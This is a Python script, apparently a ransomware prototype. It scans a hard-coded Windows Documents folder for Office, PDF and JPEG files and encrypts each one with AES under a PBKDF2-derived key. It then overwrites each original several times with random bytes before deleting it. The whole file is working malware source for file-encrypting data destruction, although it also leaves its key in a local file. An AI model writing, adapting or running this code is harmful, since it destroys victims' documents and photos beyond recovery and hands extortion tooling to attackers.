from Crypto.Cipher import AES
from pbkdf2 import PBKDF2
from os import listdir
from os.path import isfile, join
import os
import SecureString

def secure_delete(path, passes=5):
    with open(path, "ba+") as delfile:
        length = delfile.tell()
    with open(path, "br+") as delfile:
        for i in range(passes):
            delfile.seek(0)
            delfile.write(os.urandom(length))
    os.remove(path)

def gen_key():
    salt = os.urandom(16)
    key = PBKDF2("laweacosmica", salt).read(32)
    key_file = open("key.bin", "wb")
    key_file.write(key)
    key_file.close()
    return key

def gen_cipher(key):
    cipher = AES.new(key, AES.MODE_EAX)
    return cipher

def encrypt(file_in_bytes, key):
    cph = gen_cipher(key)
    cipherText, tag = cph.encrypt_and_digest(file_in_bytes)
    return cph.nonce, tag, cipherText


def main():
    key = gen_key()
    mypath = r"C:\Users\hdext\OneDrive\Documentos"
    extensions = [".docx",".xlsx", ".pdf", ".jpeg", ".jpg"]
    files = []
    for f in listdir(mypath):
        file = join(mypath, f)
        if isfile(file):
            if file.endswith(tuple(extensions)):
                files.append(file)
    for path in files:
        file_to_encrypt = open(path, "rb").read()
        encrypted_data = encrypt(file_to_encrypt, key)
        new_file = path.split(".")
        new_file_name = ''
        if new_file[1] == "docx":
            new_file_name = new_file[0] + "d.bin"
        elif new_file[1] == "xlsx":
            new_file_name = new_file[0] + "x.bin"
        elif new_file[1] == "pdf":
            new_file_name = new_file[0] + "p.bin"
        elif new_file[1] == "jpeg":
            new_file_name = new_file[0] + "j.bin"
        elif new_file[1] == "jpg":
            new_file_name = new_file[0] + "J.bin"
        encrypted_file = open(new_file_name, "wb")
        secure_delete(path)
        [encrypted_file.write(x) for x in encrypted_data]
        encrypted_file.close()
    SecureString.clearmem(key)

if __name__ == "__main__":
    main()
